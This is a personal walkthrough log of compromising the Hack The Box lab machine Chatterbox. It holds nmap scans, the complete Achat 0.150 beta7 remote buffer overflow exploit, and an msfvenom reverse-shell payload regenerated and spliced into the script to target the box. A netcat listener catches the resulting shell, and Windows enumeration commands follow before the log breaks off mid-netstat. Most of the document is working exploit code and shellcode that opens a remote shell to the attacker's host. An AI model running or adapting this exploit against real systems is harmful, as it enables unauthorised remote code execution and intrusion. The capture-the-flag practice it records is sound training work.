```

Chatterbox Hackthebox
IP: 10.10.10.74
```

```
3:35 PM 1/15/2023

							nmap -sC -sV -oA nmap 10.10.10.74

							Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 20:35 EST
							Nmap scan report for 10.10.10.74
							Host is up (0.12s latency).
							Not shown: 991 closed tcp ports (reset)
							PORT      STATE SERVICE      VERSION
							135/tcp   open  msrpc        Microsoft Windows RPC
							139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
							445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
							49152/tcp open  msrpc        Microsoft Windows RPC
							49153/tcp open  msrpc        Microsoft Windows RPC
							49154/tcp open  msrpc        Microsoft Windows RPC
							49155/tcp open  msrpc        Microsoft Windows RPC
							49156/tcp open  msrpc        Microsoft Windows RPC
							49157/tcp open  msrpc        Microsoft Windows RPC
							Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

							Host script results:
							| smb2-time: 
							|   date: 2023-01-16T06:44:05
							|_  start_date: 2023-01-16T06:34:27
							| smb-security-mode: 
							|   account_used: guest
							|   authentication_level: user
							|   challenge_response: supported
							|_  message_signing: disabled (dangerous, but default)
							| smb2-security-mode: 
							|   210: 
							|_    Message signing enabled but not required
							| smb-os-discovery: 
							|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
							|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
							|   Computer name: Chatterbox
							|   NetBIOS computer name: CHATTERBOX\x00
							|   Workgroup: WORKGROUP\x00
							|_  System time: 2023-01-16T01:44:07-05:00
							|_clock-skew: mean: 6h39m58s, deviation: 2h53m14s, median: 4h59m57s

							Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
							Nmap done: 1 IP address (1 host up) scanned in 509.44 seconds
```

```
3:49 PM 1/15/2023
Not vulnerable to eternal blue, nothing to really work with with this scan, using command below for better nmap.

 nmap -sC -sV -p- 10.10.10.74

# waiting 20 minutes for this to comeback, watched walkthrough and going to try to fiddle with it as far as i can.
```

```
4:03 PM 1/15/2023

┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Chatterbox]
└─# searchsploit achat         
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                         | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                            | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities               | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                 | php/webapps/24647.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```                                                 
4:03 PM 1/15/2023

┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Chatterbox]
└─# locate windows/remote/36025.py
/usr/share/exploitdb/exploits/windows/remote/36025.py															# code below.

	#!/usr/bin/python																							
	# Author KAhara MAnhara
	# Achat 0.150 beta7 - Buffer Overflow
	# Tested on Windows 7 32bit

	import socket
	import sys, time

	# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
	#Payload size: 512 bytes

	buf =  ""
	buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
	buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
	buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
	buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
	buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
	buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
	buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
	buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
	buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
	buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x77\x78\x62\x62"
	buf += "\x69\x70\x59\x70\x4b\x50\x73\x30\x43\x59\x5a\x45\x50"
	buf += "\x31\x67\x50\x4f\x74\x34\x4b\x50\x50\x4e\x50\x34\x4b"
	buf += "\x30\x52\x7a\x6c\x74\x4b\x70\x52\x4e\x34\x64\x4b\x63"
	buf += "\x42\x4f\x38\x4a\x6f\x38\x37\x6d\x7a\x4d\x56\x4d\x61"
	buf += "\x49\x6f\x74\x6c\x4f\x4c\x6f\x71\x33\x4c\x69\x72\x4e"
	buf += "\x4c\x4f\x30\x66\x61\x58\x4f\x5a\x6d\x59\x71\x67\x57"
	buf += "\x68\x62\x48\x72\x52\x32\x50\x57\x54\x4b\x72\x32\x4e"
	buf += "\x30\x64\x4b\x6e\x6a\x4d\x6c\x72\x6b\x70\x4c\x4a\x71"
	buf += "\x43\x48\x39\x53\x71\x38\x6a\x61\x36\x71\x4f\x61\x62"
	buf += "\x6b\x42\x39\x4f\x30\x4a\x61\x38\x53\x62\x6b\x30\x49"
	buf += "\x6b\x68\x58\x63\x4e\x5a\x6e\x69\x44\x4b\x6f\x44\x72"
	buf += "\x6b\x4b\x51\x36\x76\x70\x31\x69\x6f\x46\x4c\x57\x51"
	buf += "\x48\x4f\x4c\x4d\x6a\x61\x55\x77\x4f\x48\x57\x70\x54"
	buf += "\x35\x49\x66\x49\x73\x51\x6d\x7a\x58\x6d\x6b\x53\x4d"
	buf += "\x4e\x44\x34\x35\x38\x64\x62\x38\x62\x6b\x52\x38\x6b"
	buf += "\x74\x69\x71\x4a\x33\x33\x36\x54\x4b\x7a\x6c\x6e\x6b"
	buf += "\x72\x6b\x51\x48\x6d\x4c\x6b\x51\x67\x63\x52\x6b\x49"
	buf += "\x74\x72\x6b\x4d\x31\x7a\x30\x44\x49\x51\x34\x6e\x44"
	buf += "\x4b\x74\x61\x4b\x51\x4b\x4f\x71\x51\x49\x71\x4a\x52"
	buf += "\x31\x49\x6f\x69\x50\x31\x4f\x51\x4f\x6e\x7a\x34\x4b"
	buf += "\x6a\x72\x38\x6b\x44\x4d\x71\x4d\x50\x6a\x59\x71\x64"
	buf += "\x4d\x35\x35\x65\x62\x4b\x50\x49\x70\x4b\x50\x52\x30"
	buf += "\x32\x48\x6c\x71\x64\x4b\x72\x4f\x51\x77\x59\x6f\x79"
	buf += "\x45\x45\x6b\x48\x70\x75\x65\x35\x52\x30\x56\x72\x48"
	buf += "\x33\x76\x35\x45\x37\x4d\x63\x6d\x49\x6f\x37\x65\x6d"
	buf += "\x6c\x6a\x66\x31\x6c\x79\x7a\x51\x70\x4b\x4b\x67\x70"
	buf += "\x53\x45\x6d\x35\x55\x6b\x31\x37\x4e\x33\x32\x52\x30"
	buf += "\x6f\x42\x4a\x6d\x30\x50\x53\x79\x6f\x37\x65\x70\x63"
	buf += "\x53\x31\x72\x4c\x30\x63\x4c\x6e\x70\x65\x32\x58\x50"
	buf += "\x65\x6d\x30\x41\x41"


	# Create a UDP socket
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	server_address = ('192.168.91.130', 9256)																													# going to need to change server udp socket to match achat port and ip.

	fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
	p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
	p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
	p += "\x62" + "A"*45
	p += "\x61\x40"
	p += "\x2A\x46"
	p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
	p += "\x61\x43" + "\x2A\x46"
	p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
	p += buf + "A" * (1152 - len(buf))
	p += "\x00" + "A"*10 + "\x00"

	print "---->{P00F}!"
	i=0
	while i<len(p):
		if i > 172000:
			time.sleep(1.0)
		sent = sock.sendto(p[i:(i+8192)], server_address)
		i += sent
	sock.close()
```

```
4:11 PM 1/15/2023																										#edited code to match my paramaters, and hit enter
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.21 LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

buf =  b""															# new buffer once command was run, going to insert into bufferoverflow.py
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x79\x6c\x38\x68\x35\x32"
buf += b"\x6d\x30\x4b\x50\x6b\x50\x43\x30\x33\x59\x6a\x45\x70"
buf += b"\x31\x75\x70\x43\x34\x32\x6b\x32\x30\x4e\x50\x64\x4b"
buf += b"\x30\x52\x7a\x6c\x32\x6b\x30\x52\x7a\x74\x62\x6b\x53"
buf += b"\x42\x6c\x68\x5a\x6f\x74\x77\x6e\x6a\x6f\x36\x6e\x51"
buf += b"\x39\x6f\x64\x6c\x6f\x4c\x30\x61\x33\x4c\x69\x72\x4c"
buf += b"\x6c\x4f\x30\x69\x31\x76\x6f\x7a\x6d\x79\x71\x78\x47"
buf += b"\x6a\x42\x58\x72\x4f\x62\x51\x47\x62\x6b\x50\x52\x4a"
buf += b"\x70\x64\x4b\x4d\x7a\x6d\x6c\x42\x6b\x70\x4c\x6b\x61"
buf += b"\x71\x68\x5a\x43\x31\x38\x49\x71\x37\x61\x4e\x71\x64"
buf += b"\x4b\x70\x59\x6b\x70\x6b\x51\x38\x53\x62\x6b\x70\x49"
buf += b"\x4c\x58\x37\x73\x4c\x7a\x30\x49\x62\x6b\x30\x34\x44"
buf += b"\x4b\x6a\x61\x66\x76\x6d\x61\x4b\x4f\x46\x4c\x45\x71"
buf += b"\x76\x6f\x6c\x4d\x4b\x51\x79\x37\x70\x38\x67\x70\x70"
buf += b"\x75\x6b\x46\x6c\x43\x43\x4d\x6b\x48\x4d\x6b\x33\x4d"
buf += b"\x4e\x44\x43\x45\x67\x74\x71\x48\x64\x4b\x62\x38\x6d"
buf += b"\x54\x69\x71\x66\x73\x50\x66\x34\x4b\x4c\x4c\x70\x4b"
buf += b"\x42\x6b\x31\x48\x6b\x6c\x7a\x61\x4a\x33\x64\x4b\x79"
buf += b"\x74\x54\x4b\x4b\x51\x58\x50\x75\x39\x6d\x74\x6e\x44"
buf += b"\x6f\x34\x61\x4b\x6f\x6b\x63\x31\x71\x49\x4e\x7a\x72"
buf += b"\x31\x69\x6f\x79\x50\x71\x4f\x51\x4f\x31\x4a\x32\x6b"
buf += b"\x6d\x42\x4a\x4b\x54\x4d\x6f\x6d\x70\x68\x30\x33\x6f"
buf += b"\x42\x6b\x50\x4d\x30\x52\x48\x64\x37\x71\x63\x70\x32"
buf += b"\x61\x4f\x70\x54\x4f\x78\x4e\x6c\x62\x57\x4c\x66\x6a"
buf += b"\x67\x59\x6f\x78\x55\x45\x68\x76\x30\x39\x71\x79\x70"
buf += b"\x79\x70\x6b\x79\x46\x64\x32\x34\x72\x30\x71\x58\x6f"
buf += b"\x39\x55\x30\x30\x6b\x6b\x50\x6b\x4f\x76\x75\x62\x30"
buf += b"\x70\x50\x30\x50\x42\x30\x4d\x70\x50\x50\x6f\x50\x4e"
buf += b"\x70\x31\x58\x69\x5a\x4a\x6f\x49\x4f\x47\x70\x6b\x4f"
buf += b"\x46\x75\x62\x77\x31\x5a\x69\x75\x61\x58\x6a\x6a\x59"
buf += b"\x7a\x6e\x30\x6b\x65\x70\x68\x6c\x42\x79\x70\x4c\x44"
buf += b"\x79\x42\x54\x49\x47\x76\x4f\x7a\x6a\x70\x6f\x66\x50"
buf += b"\x57\x31\x58\x36\x39\x53\x75\x62\x54\x4f\x71\x49\x6f"
buf += b"\x4a\x35\x31\x75\x77\x50\x33\x44\x7a\x6c\x79\x6f\x50"
buf += b"\x4e\x4a\x68\x43\x45\x5a\x4c\x50\x68\x5a\x50\x66\x55"
buf += b"\x33\x72\x30\x56\x69\x6f\x77\x65\x33\x38\x51\x53\x30"
buf += b"\x6d\x31\x54\x4b\x50\x75\x39\x4b\x33\x71\x47\x62\x37"
buf += b"\x30\x57\x6e\x51\x49\x66\x31\x5a\x6d\x42\x4f\x69\x70"
buf += b"\x56\x79\x52\x59\x6d\x50\x66\x38\x47\x50\x44\x6e\x44"
buf += b"\x4d\x6c\x59\x71\x49\x71\x44\x4d\x6e\x64\x6f\x34\x7a"
buf += b"\x70\x37\x56\x49\x70\x6f\x54\x32\x34\x70\x50\x4e\x76"
buf += b"\x70\x56\x4e\x76\x4d\x76\x71\x46\x30\x4e\x72\x36\x42"
buf += b"\x36\x50\x53\x51\x46\x42\x48\x43\x49\x36\x6c\x6d\x6f"
buf += b"\x43\x56\x49\x6f\x37\x65\x55\x39\x4b\x30\x50\x4e\x6f"
buf += b"\x66\x4f\x56\x69\x6f\x4c\x70\x62\x48\x4c\x48\x33\x57"
buf += b"\x4b\x6d\x61\x50\x49\x6f\x67\x65\x47\x4b\x58\x70\x47"
buf += b"\x45\x55\x52\x71\x46\x52\x48\x56\x46\x33\x65\x65\x6d"
buf += b"\x73\x6d\x4b\x4f\x68\x55\x4d\x6c\x5a\x66\x73\x4c\x39"
buf += b"\x7a\x35\x30\x59\x6b\x69\x50\x71\x65\x4d\x35\x55\x6b"
buf += b"\x4f\x57\x6e\x33\x32\x52\x50\x6f\x70\x6a\x6b\x50\x6e"
buf += b"\x73\x39\x6f\x76\x75\x41\x41"
```

```
4:14 PM 1/15/2023
																					# COMPLETELY Adjusted bufferoverflox.py (Achat 0.150 beta7 - Remote Buffer Overflow  | windows/remote/36025.py)

	#!/usr/bin/python
	# Author KAhara MAnhara
	# Achat 0.150 beta7 - Buffer Overflow
	# Tested on Windows 7 32bit

	import socket
	import sys, time

	# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.21 LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
	#Payload size: 512 bytes

	buf =  b""
	buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
	buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
	buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
	buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
	buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
	buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
	buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
	buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
	buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
	buf += b"\x47\x42\x39\x75\x34\x4a\x42\x79\x6c\x38\x68\x35\x32"
	buf += b"\x6d\x30\x4b\x50\x6b\x50\x43\x30\x33\x59\x6a\x45\x70"
	buf += b"\x31\x75\x70\x43\x34\x32\x6b\x32\x30\x4e\x50\x64\x4b"
	buf += b"\x30\x52\x7a\x6c\x32\x6b\x30\x52\x7a\x74\x62\x6b\x53"
	buf += b"\x42\x6c\x68\x5a\x6f\x74\x77\x6e\x6a\x6f\x36\x6e\x51"
	buf += b"\x39\x6f\x64\x6c\x6f\x4c\x30\x61\x33\x4c\x69\x72\x4c"
	buf += b"\x6c\x4f\x30\x69\x31\x76\x6f\x7a\x6d\x79\x71\x78\x47"
	buf += b"\x6a\x42\x58\x72\x4f\x62\x51\x47\x62\x6b\x50\x52\x4a"
	buf += b"\x70\x64\x4b\x4d\x7a\x6d\x6c\x42\x6b\x70\x4c\x6b\x61"
	buf += b"\x71\x68\x5a\x43\x31\x38\x49\x71\x37\x61\x4e\x71\x64"
	buf += b"\x4b\x70\x59\x6b\x70\x6b\x51\x38\x53\x62\x6b\x70\x49"
	buf += b"\x4c\x58\x37\x73\x4c\x7a\x30\x49\x62\x6b\x30\x34\x44"
	buf += b"\x4b\x6a\x61\x66\x76\x6d\x61\x4b\x4f\x46\x4c\x45\x71"
	buf += b"\x76\x6f\x6c\x4d\x4b\x51\x79\x37\x70\x38\x67\x70\x70"
	buf += b"\x75\x6b\x46\x6c\x43\x43\x4d\x6b\x48\x4d\x6b\x33\x4d"
	buf += b"\x4e\x44\x43\x45\x67\x74\x71\x48\x64\x4b\x62\x38\x6d"
	buf += b"\x54\x69\x71\x66\x73\x50\x66\x34\x4b\x4c\x4c\x70\x4b"
	buf += b"\x42\x6b\x31\x48\x6b\x6c\x7a\x61\x4a\x33\x64\x4b\x79"
	buf += b"\x74\x54\x4b\x4b\x51\x58\x50\x75\x39\x6d\x74\x6e\x44"
	buf += b"\x6f\x34\x61\x4b\x6f\x6b\x63\x31\x71\x49\x4e\x7a\x72"
	buf += b"\x31\x69\x6f\x79\x50\x71\x4f\x51\x4f\x31\x4a\x32\x6b"
	buf += b"\x6d\x42\x4a\x4b\x54\x4d\x6f\x6d\x70\x68\x30\x33\x6f"
	buf += b"\x42\x6b\x50\x4d\x30\x52\x48\x64\x37\x71\x63\x70\x32"
	buf += b"\x61\x4f\x70\x54\x4f\x78\x4e\x6c\x62\x57\x4c\x66\x6a"
	buf += b"\x67\x59\x6f\x78\x55\x45\x68\x76\x30\x39\x71\x79\x70"
	buf += b"\x79\x70\x6b\x79\x46\x64\x32\x34\x72\x30\x71\x58\x6f"
	buf += b"\x39\x55\x30\x30\x6b\x6b\x50\x6b\x4f\x76\x75\x62\x30"
	buf += b"\x70\x50\x30\x50\x42\x30\x4d\x70\x50\x50\x6f\x50\x4e"
	buf += b"\x70\x31\x58\x69\x5a\x4a\x6f\x49\x4f\x47\x70\x6b\x4f"
	buf += b"\x46\x75\x62\x77\x31\x5a\x69\x75\x61\x58\x6a\x6a\x59"
	buf += b"\x7a\x6e\x30\x6b\x65\x70\x68\x6c\x42\x79\x70\x4c\x44"
	buf += b"\x79\x42\x54\x49\x47\x76\x4f\x7a\x6a\x70\x6f\x66\x50"
	buf += b"\x57\x31\x58\x36\x39\x53\x75\x62\x54\x4f\x71\x49\x6f"
	buf += b"\x4a\x35\x31\x75\x77\x50\x33\x44\x7a\x6c\x79\x6f\x50"
	buf += b"\x4e\x4a\x68\x43\x45\x5a\x4c\x50\x68\x5a\x50\x66\x55"
	buf += b"\x33\x72\x30\x56\x69\x6f\x77\x65\x33\x38\x51\x53\x30"
	buf += b"\x6d\x31\x54\x4b\x50\x75\x39\x4b\x33\x71\x47\x62\x37"
	buf += b"\x30\x57\x6e\x51\x49\x66\x31\x5a\x6d\x42\x4f\x69\x70"
	buf += b"\x56\x79\x52\x59\x6d\x50\x66\x38\x47\x50\x44\x6e\x44"
	buf += b"\x4d\x6c\x59\x71\x49\x71\x44\x4d\x6e\x64\x6f\x34\x7a"
	buf += b"\x70\x37\x56\x49\x70\x6f\x54\x32\x34\x70\x50\x4e\x76"
	buf += b"\x70\x56\x4e\x76\x4d\x76\x71\x46\x30\x4e\x72\x36\x42"
	buf += b"\x36\x50\x53\x51\x46\x42\x48\x43\x49\x36\x6c\x6d\x6f"
	buf += b"\x43\x56\x49\x6f\x37\x65\x55\x39\x4b\x30\x50\x4e\x6f"
	buf += b"\x66\x4f\x56\x69\x6f\x4c\x70\x62\x48\x4c\x48\x33\x57"
	buf += b"\x4b\x6d\x61\x50\x49\x6f\x67\x65\x47\x4b\x58\x70\x47"
	buf += b"\x45\x55\x52\x71\x46\x52\x48\x56\x46\x33\x65\x65\x6d"
	buf += b"\x73\x6d\x4b\x4f\x68\x55\x4d\x6c\x5a\x66\x73\x4c\x39"
	buf += b"\x7a\x35\x30\x59\x6b\x69\x50\x71\x65\x4d\x35\x55\x6b"
	buf += b"\x4f\x57\x6e\x33\x32\x52\x50\x6f\x70\x6a\x6b\x50\x6e"
	buf += b"\x73\x39\x6f\x76\x75\x41\x41"



	# Create a UDP socket
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	server_address = ('10.10.10.74', 9256)

	fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
	p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
	p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
	p += "\x62" + "A"*45
	p += "\x61\x40"
	p += "\x2A\x46"
	p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
	p += "\x61\x43" + "\x2A\x46"
	p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
	p += buf + "A" * (1152 - len(buf))
	p += "\x00" + "A"*10 + "\x00"

	print "---->{P00F}!"
	i=0
	while i<len(p):
		if i > 172000:
			time.sleep(1.0)
		sent = sock.sendto(p[i:(i+8192)], server_address)
		i += sent
	sock.close()
```

```	
4:17 PM 1/15/2023
┌──(root㉿kali)-[/home/kali]																				# setting up netcat
└─# nc -lvnp 1234               
listening on [any] 1234 ...
```

```
4:18 PM 1/15/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Chatterbox]												# running bufferoverflow
└─# python2 bufferoverflow.py
---->{P00F}!
```

```
4:18 PM 1/15/2023
┌──(root㉿kali)-[/home/kali]																				# on box, going to follow Priv esc notes.
└─# nc -lvnp 1234               
listening on [any] 1234 ...
connect to [10.10.16.21] from (UNKNOWN) [10.10.10.74] 49162
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```

```
4:21 PM 1/15/2023

C:\Windows\system32>systeminfo
systeminfo

Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          1/16/2023, 1:34:17 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,565 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,637 MB
Virtual Memory: In Use:    458 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
Hotfix(s):                 183 Hotfix(s) Installed.
                          
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.74
```

```
4:23 PM 1/15/2023
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

```
4:24 PM 1/15/2023
C:\Windows\system32>net user    
net user 

User accounts for \\CHATTERBOX

-------------------------------------------------------------------------------
Administrator            Alfred                   Guest   
```

```
4:24 PM 1/15/2023
C:\Windows\system32>net user administrator
net user administrator
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/10/2017 9:21:19 AM
Password expires             Never
Password changeable          12/10/2017 9:21:19 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   1/16/2023 1:35:00 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

```
4:25 PM 1/15/2023
C:\Windows\system32>net localgroup
net localgroup

Aliases for \\CHATTERBOX

-------------------------------------------------------------------------------
*Administrators
*Backup Operators
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Replicator
*Users
```

```
4:26 PM 1/15/2023
C:\Windows\system32>arp -a
arp -a

Interface: 10.10.10.74 --- 0xd
  Internet Address      Physical Address      Type
  10.10.10.2            00-50-56-b9-2e-45     dynamic   
  10.10.10.8            00-50-56-b9-ad-b0     dynamic   
  10.10.10.40           00-50-56-b9-ad-fc     dynamic   
  10.10.10.255          ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static    
```

```
4:27 PM 1/15/2023
C:\Windows\system32>netstat -ano																						# shows achat ports 9255/9256 still no luck getting them on nmap for some reason........ 30 mins later
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       352
